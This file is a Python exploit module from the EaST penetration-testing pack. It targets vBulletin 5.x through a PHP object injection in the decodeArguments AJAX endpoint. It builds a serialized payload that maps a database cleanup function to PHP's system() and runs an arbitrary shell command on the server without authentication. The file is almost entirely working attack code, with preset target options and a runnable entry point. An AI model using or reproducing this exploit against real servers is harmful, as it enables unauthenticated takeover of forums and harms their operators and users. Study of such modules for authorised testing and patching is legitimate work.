#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

from collections import OrderedDict
import urlparse
import urllib
from shellcodes.Shellcodes import CrossOSShellcodes

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "vBulletin_deserialize_code_exec"
INFO['DESCRIPTION'] = "vBulletin 5.x Deserialize Code Execution"
INFO['VENDOR'] = "https://www.vbulletin.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    This module exploits a PHP Object Injection vulnerability in vBulletin 5.X which could be abused to allow
unauthenticated users to execute shell commands.
Tested against vBulletin CE 5.0.5 on Windows 7 SP1 x64.
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = ['']
INFO['CHANGELOG'] = "14 Sep, 2016. Written by Gleg team."
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 81
OPTIONS["SSL"] = False
OPTIONS["BASEPATH"] = "/vbulletin5"
OPTIONS["COMMAND"] = "dir"



class exploit(Sploit):
    def __init__(self, host='', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS["HOST"])
        self.port = self.args.get('PORT', OPTIONS["PORT"])
        self.path = self.args.get('BASEPATH', OPTIONS["BASEPATH"])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.command = self.args.get('COMMAND', OPTIONS["COMMAND"])
        proto = "https" if self.ssl else "http"
        self.url = urlparse.urljoin("{}://{}:{}/".format(proto, self.host, self.port), self.path)

    def run(self):
        self.args()
        self.log("[*] Trying execute command...")
        self.log(">> " + self.command)
        vuln_url = self.url + '/ajax/api/hook/decodeArguments?'
        data = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:'
        data += '{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:PAYLOAD_LENGTH:"PAYLOAD";}'
        data = data.replace('PAYLOAD_LENGTH', str(len(self.command))).replace('PAYLOAD', self.command)
        res = urllib.urlopen(vuln_url+data).read()
        self.log(res)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()